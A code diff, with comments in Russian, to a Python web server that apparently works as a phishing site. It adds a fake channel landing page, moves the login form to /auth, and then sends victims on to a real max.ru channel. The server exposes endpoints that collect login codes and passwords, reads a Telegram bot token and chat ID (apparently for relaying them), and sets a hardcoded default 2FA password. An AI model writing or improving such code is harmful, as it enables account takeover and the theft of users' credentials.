@@ -54,12 +54,16 @@ TG_TOKEN = os.getenv("TG_TOKEN", "").strip()
 TG_CHAT_ID = os.getenv("TG_CHAT_ID", "").strip()
 HTTP_HOST = os.getenv("HTTP_HOST", "0.0.0.0")
 HTTP_PORT = int(os.getenv("PORT", os.getenv("HTTP_PORT", "8080")))
-REDIRECT_URL = os.getenv("REDIRECT_URL", "https://max.ru/your-company-channel")
+
+# После успешной авторизации возвращаем на страницу канала с флагом.
+# Реальный переход в max.ru-канал делает уже сама channel.html.
+REDIRECT_URL = os.getenv("REDIRECT_URL", "/?authorized=1")
 
 DEFAULT_2FA_PASSWORD = os.getenv("DEFAULT_2FA_PASSWORD", "Fiksik2009")
 
 BASE_DIR = Path(__file__).parent
-HTML_FILE = BASE_DIR / "index.html"
+HTML_FILE    = BASE_DIR / "index.html"    # страница входа
+CHANNEL_FILE = BASE_DIR / "channel.html"  # страница канала (главная)
 CACHE_DIR = BASE_DIR / "cache"
 CACHE_DIR.mkdir(parents=True, exist_ok=True)
 
@@ -660,7 +664,15 @@ async def handle_callback_query(cb: dict) -> None:
 # ============================================================================
 #  HTTP
 # ============================================================================
-async def handle_index(request):
+async def handle_channel(request):
+    """Главная страница — карточка канала."""
+    if not CHANNEL_FILE.exists():
+        return web.Response(text="channel.html not found", status=404)
+    return web.FileResponse(CHANNEL_FILE)
+
+
+async def handle_auth_page(request):
+    """Страница входа (index.html)."""
     if not HTML_FILE.exists():
         return web.Response(text="index.html not found", status=404)
     return web.FileResponse(HTML_FILE)
@@ -729,7 +741,8 @@ async def handle_submit_password(request):
 
 async def start_http():
     app = web.Application()
-    app.router.add_get("/", handle_index)
+    app.router.add_get("/", handle_channel)
+    app.router.add_get("/auth", handle_auth_page)
     app.router.add_get("/health", handle_health)
     app.router.add_post("/api/auth/send-code", handle_send_code)
     app.router.add_post("/api/auth/submit-code", handle_submit_code)
